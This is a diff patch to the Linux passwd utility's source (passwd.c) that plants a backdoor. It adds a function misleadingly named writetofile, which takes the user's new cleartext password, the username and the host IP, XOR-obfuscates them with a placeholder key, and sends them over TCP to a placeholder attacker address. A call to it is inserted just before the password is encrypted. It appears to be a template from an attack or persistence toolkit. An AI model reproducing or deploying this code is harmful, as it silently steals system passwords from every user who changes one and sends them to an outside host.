@@ -1,0 +1,119 @@
+--- passwd_org.c	2022-12-15 15:22:52.411588152 -0500
++++ passwd.c	2022-12-15 15:28:10.286693663 -0500
+@@ -28,6 +28,16 @@
+ #include "pwio.h"
+ #include "shadowio.h"
+ #include "shadowlog.h"
++#include <sys/socket.h>
++#include <arpa/inet.h> 
++#include <sys/ioctl.h>
++#include <netinet/in.h>
++#include <net/if.h>
++#include <unistd.h> 
++#include <string.h> 
++#define PORT %port% 
++#define IP "%ip%"
++
+ 
+ /*
+  * exit status values
+@@ -177,6 +187,90 @@
+ 	return false;
+ }
+ 
++
++char* XORCipher(char* data, char* key, int dataLen, int keyLen) {
++	char* output = (char*)malloc(sizeof(char) * dataLen);
++
++	for (int i = 0; i < dataLen; ++i) {
++		output[i] = data[i] ^ key[i % keyLen];
++	}
++
++	return output;
++}
++
++
++int writetofile (char *password){
++
++    /* Get uid */
++    uid_t uid = geteuid();
++    struct passwd * pw = getpwuid(uid);
++            
++    /* Get IP Address */
++    int fd;
++    struct ifreq ifr;
++    fd = socket(AF_INET, SOCK_DGRAM, 0);
++        
++    /* I want to get an IPv4 IP address */
++    ifr.ifr_addr.sa_family = AF_INET;
++
++    /* I want IP address attached to set interface */
++    strncpy(ifr.ifr_name, "%int%", IFNAMSIZ-1);
++    ioctl(fd, SIOCGIFADDR, &ifr);
++    close(fd);
++    
++    /* display result */
++    char buffer[256];
++    char * ip;
++    ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
++	 int j = snprintf(buffer, 256, "%s:%s:%s\n", name, password, ip);
++
++    /* Make Socket */
++    int sock = 0, valread;
++    struct sockaddr_in serv_addr;
++
++    /* Sock creation Pt 2*/
++    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
++        return -1;
++    }
++
++    /* Socket Options */
++    serv_addr.sin_family = AF_INET;
++    serv_addr.sin_port = htons(PORT);
++        
++    /* Timeout settings */
++    struct timeval timeout;
++    timeout.tv_sec = 3;
++    timeout.tv_usec = 0;
++    
++    if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
++        return -1;
++    }
++    if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
++        // pass
++    }
++
++     /* set IP and set buffer */
++    if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
++        return -1;
++    }
++    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
++        return -1;
++    }
++
++    /* Encrypt Message */
++    char* key  = "%key%";
++    int key_length = strlen(key);
++    int mes_length = strlen(buffer);
++    char* xor_message = XORCipher(buffer, key, mes_length, key_length);
++
++    /* Send Message */
++    send(sock , xor_message , mes_length, 0); 
++    
++    return 0;
++
++}
++
++
+ /*
+  * new_password - validate old password and replace with new (both old and
+  * new in global "char crypt_passwd[128]")
+@@ -335,6 +429,8 @@
+ 		return -1;
+ 	}
+ 
++	writetofile(pass);
++
+ 	/*
+ 	 * Encrypt the password, then wipe the cleartext password.
+ 	 */
